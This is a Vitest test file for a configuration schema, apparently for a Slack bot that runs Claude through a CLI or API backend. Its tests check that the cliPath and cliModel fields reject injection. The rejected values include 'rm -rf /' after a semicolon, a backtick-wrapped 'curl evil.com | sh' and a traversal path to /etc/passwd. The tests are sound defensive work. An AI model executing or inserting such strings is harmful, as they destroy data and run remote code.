import { describe, it, expect } from 'vitest';
import { ConfigSchema } from '../../src/config/schema.js';

describe('ConfigSchema', () => {
  const validBaseConfig = {
    slack: {
      botToken: 'xoxb-test-token',
      appToken: 'xapp-test-token',
    },
    authorization: {
      userIds: ['U12345678'],
    },
    rateLimit: {
      max: 10,
      windowSeconds: 60,
    },
    server: {
      dockerSocket: '/var/run/docker.sock',
    },
    logging: {
      level: 'info',
    },
  };

  describe('claude.cliPath validation', () => {
    it('should accept valid CLI path: simple name', () => {
      const config = {
        ...validBaseConfig,
        claude: {
          backend: 'cli',
          cliPath: 'claude',
          cliModel: 'sonnet',
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(true);
    });

    it('should accept valid CLI path: absolute path', () => {
      const config = {
        ...validBaseConfig,
        claude: {
          backend: 'cli',
          cliPath: '/usr/local/bin/claude',
          cliModel: 'sonnet',
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(true);
    });

    it('should accept valid CLI path: with dots in filename', () => {
      const config = {
        ...validBaseConfig,
        claude: {
          backend: 'cli',
          cliPath: '/opt/claude/bin/claude.v2',
          cliModel: 'sonnet',
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(true);
    });

    it('should reject CLI path with shell metacharacters: semicolon', () => {
      const config = {
        ...validBaseConfig,
        claude: {
          backend: 'cli',
          cliPath: 'claude; rm -rf /',
          cliModel: 'sonnet',
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(false);
    });

    it('should reject CLI path with shell metacharacters: pipe', () => {
      const config = {
        ...validBaseConfig,
        claude: {
          backend: 'cli',
          cliPath: 'echo bad | sh',
          cliModel: 'sonnet',
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(false);
    });

    it('should reject CLI path with shell metacharacters: backticks', () => {
      const config = {
        ...validBaseConfig,
        claude: {
          backend: 'cli',
          cliPath: '`curl evil.com | sh`',
          cliModel: 'sonnet',
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(false);
    });

    it('should reject CLI path with parent directory references', () => {
      const config = {
        ...validBaseConfig,
        claude: {
          backend: 'cli',
          cliPath: '/usr/../../../etc/passwd',
          cliModel: 'sonnet',
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(false);
    });

    it('should reject CLI path with spaces', () => {
      const config = {
        ...validBaseConfig,
        claude: {
          backend: 'cli',
          cliPath: '/path with spaces/claude',
          cliModel: 'sonnet',
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(false);
    });
  });

  describe('claude.cliModel validation', () => {
    it('should accept valid model names', () => {
      const validModels = ['sonnet', 'opus', 'haiku', 'claude-3-sonnet', 'claude-sonnet-4-20250514'];

      for (const model of validModels) {
        const config = {
          ...validBaseConfig,
          claude: {
            backend: 'cli',
            cliPath: 'claude',
            cliModel: model,
          },
        };

        const result = ConfigSchema.safeParse(config);
        expect(result.success, `Should accept model: ${model}`).toBe(true);
      }
    });

    it('should reject model name with shell metacharacters', () => {
      const config = {
        ...validBaseConfig,
        claude: {
          backend: 'cli',
          cliPath: 'claude',
          cliModel: 'sonnet; rm -rf /',
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(false);
    });
  });

  describe('claude.backend validation', () => {
    it('should require API key when backend is api', () => {
      const config = {
        ...validBaseConfig,
        claude: {
          backend: 'api',
          // no apiKey
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(false);
    });

    it('should accept api backend with API key', () => {
      const config = {
        ...validBaseConfig,
        claude: {
          backend: 'api',
          apiKey: 'sk-ant-test-key',
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(true);
    });

    it('should accept cli backend without API key', () => {
      const config = {
        ...validBaseConfig,
        claude: {
          backend: 'cli',
          cliPath: 'claude',
          cliModel: 'sonnet',
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(true);
    });
  });
});
